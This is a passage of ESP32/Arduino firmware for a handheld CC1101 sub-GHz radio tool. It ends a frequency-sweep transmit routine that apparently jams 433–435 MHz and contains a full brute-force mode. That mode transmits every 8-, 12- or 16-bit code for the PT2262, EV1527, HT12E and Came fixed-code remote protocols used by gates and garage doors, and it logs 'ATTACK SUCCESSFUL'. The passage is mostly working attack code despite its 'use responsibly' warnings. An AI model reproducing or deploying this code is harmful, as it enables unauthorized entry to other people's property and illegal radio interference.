          int barPos = (int)((sweepFreq - 433.0) * 64.0);
          u8g2.drawFrame(0, 60, 64, 3);
          u8g2.drawBox(barPos, 60, 2, 3);
          
          ELECHOUSE_cc1101.setMHZ(sweepFreq);
          ELECHOUSE_cc1101.SetTx();
          
          pinMode(CC1101_GDO0, OUTPUT);
          for (int i = 0; i < 10; i++) {
            digitalWrite(CC1101_GDO0, HIGH);
            delayMicroseconds(50);
            digitalWrite(CC1101_GDO0, LOW);
            delayMicroseconds(50);
          }
          
          
          sweepFreq += 0.15 * sweepDir;
          if (sweepFreq >= 435.0) {
            sweepFreq = 435.0;
            sweepDir = -1;
          } else if (sweepFreq <= 433.0) {
            sweepFreq = 433.0;
            sweepDir = 1;
          }
          break;
        }
      }
    }
    
    
    u8g2.drawHLine(0, 61, 128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(30, 63, "BACK: Stop");
    
    u8g2.sendBuffer();
    
    
    if (isButtonPressed(BTN_BACK) || elapsed > 30) {
      isActive = false;
      
      // Safe shutdown
      pinMode(CC1101_GDO0, INPUT);
      ELECHOUSE_cc1101.SetRx();
      ELECHOUSE_cc1101.setMHZ(currentFreq);
      
      Serial.println("╔════════════════════════════════════════╗");
      Serial.println("║   EXPERIMENT STOPPED                   ║");
      Serial.printf("║   Duration: %lu seconds               ║\n", elapsed);
      Serial.println("╚════════════════════════════════════════╝");
      
      if (elapsed >= 30) {
        setStatusMsg("Auto-stopped (30s)");
      } else {
        setStatusMsg("Stopped by user");
      }
      
      safeDelay(500);
    }
  }
  
  // Exit to main menu
  if (isButtonPressed(BTN_BACK) && !isActive) {
    pinMode(CC1101_GDO0, INPUT);
    ELECHOUSE_cc1101.SetRx();
    mode = -1;
    safeDelay(200);
  }
}






void drawBruteForce() {
  static bool isRunning = false;
  static int bruteMode = 0; // 0=8bit, 1=12bit, 2=16bit
  static uint32_t currentCode = 0;
  static uint32_t maxCode = 0xFF;
  static unsigned long lastSend = 0;
  static int protoSelect = 0; // Selected protocol for brute force
  static unsigned long startTime = 0;
  static int lastReportedProgress = -1;
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tf);
  u8g2.drawStr(5, 10, "BRUTE FORCE");
  
  u8g2.setFont(u8g2_font_5x7_tr);
  u8g2.drawStr(15, 18, "! USE RESPONSIBLY !");
  
  if (!isRunning) {
    // Setup screen
    const char* modeNames[] = {"8-bit (256)", "12-bit (4K)", "16-bit (65K)"};
    const char* protoNames[] = {"PT2262", "EV1527", "HT12E", "Came"};
    
    char line[40];
    
    // Mode selection with visual highlight
    u8g2.drawStr(0, 30, ">");
    sprintf(line, "Bits: %s", modeNames[bruteMode]);
    u8g2.drawStr(8, 30, line);
    
    sprintf(line, " Proto: %s", protoNames[protoSelect]);
    u8g2.drawStr(8, 40, line);
    
    sprintf(line, " Freq: %.2fMHz", currentFreq);
    u8g2.drawStr(8, 50, line);
    
    // Estimated time
    uint32_t totalCodes = (bruteMode == 0) ? 256 : (bruteMode == 1 ? 4096 : 65536);
    uint32_t estSeconds = totalCodes / 20; // 20 codes/sec
    sprintf(line, "Est: ~%lus (%lum)", estSeconds, estSeconds / 60);
    u8g2.drawStr(0, 60, line);
    
    drawStatusBar();
    u8g2.sendBuffer();
    
    // Controls
    if (isButtonPressed(BTN_UP)) {
      bruteMode = (bruteMode + 1) % 3;
      Serial.println("\n┌─────────────────────────────────────────┐");
      Serial.println("│      BRUTE FORCE CONFIGURATION          │");
      Serial.println("└─────────────────────────────────────────┘");
      Serial.printf(" Mode:       %s\n", modeNames[bruteMode]);
      Serial.printf(" Protocol:   %s\n", protoNames[protoSelect]);
      Serial.printf(" Frequency:  %.2f MHz\n", currentFreq);
      
      uint32_t codes = (bruteMode == 0) ? 256 : (bruteMode == 1 ? 4096 : 65536);
      Serial.printf(" Total Codes: %lu\n", (unsigned long)codes);
      Serial.printf("  Est. Time:  ~%lu minutes\n", (unsigned long)(codes / 20 / 60));
      Serial.println();
      
      safeDelay(200);
    }
    if (isButtonPressed(BTN_DOWN)) {
      protoSelect = (protoSelect + 1) % 4;
      Serial.printf(" Protocol changed to: %s\n\n", protoNames[protoSelect]);
      safeDelay(200);
    }
    
    if (isButtonPressed(BTN_SELECT)) {
      isRunning = true;
      currentCode = 0;
      startTime = millis();
      lastReportedProgress = -1;
      
      // Set max based on mode
      if (bruteMode == 0) maxCode = 0xFF;        // 8-bit
      else if (bruteMode == 1) maxCode = 0xFFF;  // 12-bit
      else maxCode = 0xFFFF;                     // 16-bit
      
      Serial.println("\n╔════════════════════════════════════════╗");
      Serial.println("║     BRUTE FORCE ATTACK INITIATED       ║");
      Serial.println("╚════════════════════════════════════════╝");
      Serial.println("  WARNING: This is a powerful attack tool");
      Serial.println("  Use only on your own devices or with permission");
      Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
      Serial.printf(" Attack Mode:  %s\n", modeNames[bruteMode]);
      Serial.printf(" Protocol:     %s\n", protoNames[protoSelect]);
      Serial.printf(" Frequency:    %.2f MHz\n", currentFreq);
      Serial.printf(" Total Codes:  %lu (0x%X)\n", (unsigned long)(maxCode + 1), maxCode);
      Serial.printf(" Speed:        ~20 codes/sec\n");
      Serial.printf("  Est. Time:    ~%lu minutes\n", (unsigned long)((maxCode + 1) / 20 / 60));
      Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
      Serial.printf(" Starting at:  %lu ms\n", millis());
      Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
      
      safeDelay(200);
    }
    
  } else {
   
    unsigned long elapsed = (millis() - startTime) / 1000;
    float progress = ((float)currentCode / (float)maxCode) * 100.0;
    
    char line[40];
    
   
    sprintf(line, "Progress: %.1f%%", progress);
    u8g2.drawStr(0, 28, line);
    
    
    sprintf(line, "0x%04X / 0x%04X", currentCode, maxCode);
    u8g2.drawStr(0, 38, line);
    
    
    if (elapsed < 60) {
      sprintf(line, "Time: %lus", elapsed);
    } else {
      sprintf(line, "Time: %lum %lus", elapsed / 60, elapsed % 60);
    }
    u8g2.drawStr(0, 48, line);
    
    
    int codesPerSec = (elapsed > 0) ? (currentCode / elapsed) : 0;
    sprintf(line, "%dc/s", codesPerSec);
    u8g2.drawStr(100, 48, line);
    
   
    u8g2.drawFrame(0, 56, 128, 8);
    int barW = (int)((progress / 100.0) * 126);
    if (barW > 0) u8g2.drawBox(1, 57, barW, 6);
    
    drawStatusBar();
    u8g2.sendBuffer();
    
    
    int progressPercent = (int)progress;
    
    
    if (progressPercent % 10 == 0 && progressPercent != lastReportedProgress) {
      lastReportedProgress = progressPercent;
      
      unsigned long remaining = 0;
      if (codesPerSec > 0) {
        remaining = (maxCode - currentCode) / codesPerSec;
      }
      
      Serial.println("┌─────────────────────────────────────────┐");
      Serial.printf("│   PROGRESS: %3d%%                         │\n", progressPercent);
      Serial.println("└─────────────────────────────────────────┘");
      Serial.printf(" Current:    0x%04X (%lu / %lu)\n", currentCode, (unsigned long)currentCode, (unsigned long)maxCode);
      Serial.printf(" Speed:      %d codes/sec\n", codesPerSec);
      Serial.printf("  Elapsed:    %lum %lus\n", elapsed / 60, elapsed % 60);
      if (remaining > 0) {
        Serial.printf(" Remaining:  ~%lum %lus\n", remaining / 60, remaining % 60);
      }
      Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    }
    
    
    if (millis() - lastSend > 50) { 
      // Get protocol
      const ProtocolDef* proto = &PROTOCOLS[protoSelect];
      
      ELECHOUSE_cc1101.setMHZ(currentFreq);
      ELECHOUSE_cc1101.SetTx();
      
      // Encode and send
      pinMode(CC1101_GDO0, OUTPUT);
      
      // Sync pulse
      digitalWrite(CC1101_GDO0, HIGH);
      delayMicroseconds(proto->syncPulse);
      digitalWrite(CC1101_GDO0, LOW);
      delayMicroseconds(proto->shortPulse);
      
      // Data bits
      int bits = (bruteMode == 0) ? 8 : (bruteMode == 1 ? 12 : 16);
      for (int i = bits - 1; i >= 0; i--) {
        if (currentCode & (1 << i)) {
          // Bit = 1 (long pulse)
          digitalWrite(CC1101_GDO0, HIGH);
          delayMicroseconds(proto->longPulse);
          digitalWrite(CC1101_GDO0, LOW);
          delayMicroseconds(proto->shortPulse);
        } else {
          // Bit = 0 (short pulse)
          digitalWrite(CC1101_GDO0, HIGH);
          delayMicroseconds(proto->shortPulse);
          digitalWrite(CC1101_GDO0, LOW);
          delayMicroseconds(proto->longPulse);
        }
      }
      
      digitalWrite(CC1101_GDO0, LOW);
      pinMode(CC1101_GDO0, INPUT);
      ELECHOUSE_cc1101.SetRx();
      
      lastSend = millis();
      currentCode++;
      
      
      if (currentCode > maxCode) {
        isRunning = false;
        
        unsigned long totalTime = (millis() - startTime) / 1000;
        float avgSpeed = (float)currentCode / (float)totalTime;
        
        Serial.println("\n╔════════════════════════════════════════╗");
        Serial.println("║     BRUTE FORCE ATTACK COMPLETE!      ║");
        Serial.println("╚════════════════════════════════════════╝");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.println(" FINAL STATISTICS:");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf("✓ Codes Tested:  %lu\n", (unsigned long)currentCode);
        Serial.printf("✓ Total Time:    %lum %lus\n", totalTime / 60, totalTime % 60);
        Serial.printf("✓ Avg Speed:     %.1f codes/sec\n", avgSpeed);
        Serial.printf("✓ Protocol:      %s\n", protoSelect == 0 ? "PT2262" : protoSelect == 1 ? "EV1527" : protoSelect == 2 ? "HT12E" : "Came");
        Serial.printf("✓ Frequency:     %.2f MHz\n", currentFreq);
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.println(" All possible codes transmitted");
        Serial.println("╔════════════════════════════════════════╗");
        Serial.println("║          ATTACK SUCCESSFUL!            ║");
        Serial.println("╚════════════════════════════════════════╝\n");
        
        setStatusMsg("Complete!");
      }
    }
    
    // Stop button
    if (isButtonPressed(BTN_BACK)) {
      isRunning = false;
      pinMode(CC1101_GDO0, INPUT);
      ELECHOUSE_cc1101.SetRx();
      
      unsigned long totalTime = (millis() - startTime) / 1000;
      
      Serial.println("\n╔════════════════════════════════════════╗");
      Serial.println("║     BRUTE FORCE STOPPED BY USER        ║");
      Serial.println("╚════════════════════════════════════════╝");
      Serial.printf("  Stopped at:   0x%04X / 0x%04X\n", currentCode, maxCode);
      Serial.printf("  Time Elapsed: %lum %lus\n", totalTime / 60, totalTime % 60);
      Serial.printf(" Codes Tested:  %lu (%.1f%%)\n", (unsigned long)currentCode, ((float)currentCode / (float)maxCode) * 100.0);
      Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
      
      safeDelay(200);
    }
  }

  if (isButtonPressed(BTN_BACK) && !isRunning) {
    Serial.println(" Exiting Brute Force Mode\n");
    mode = -1;
  }
}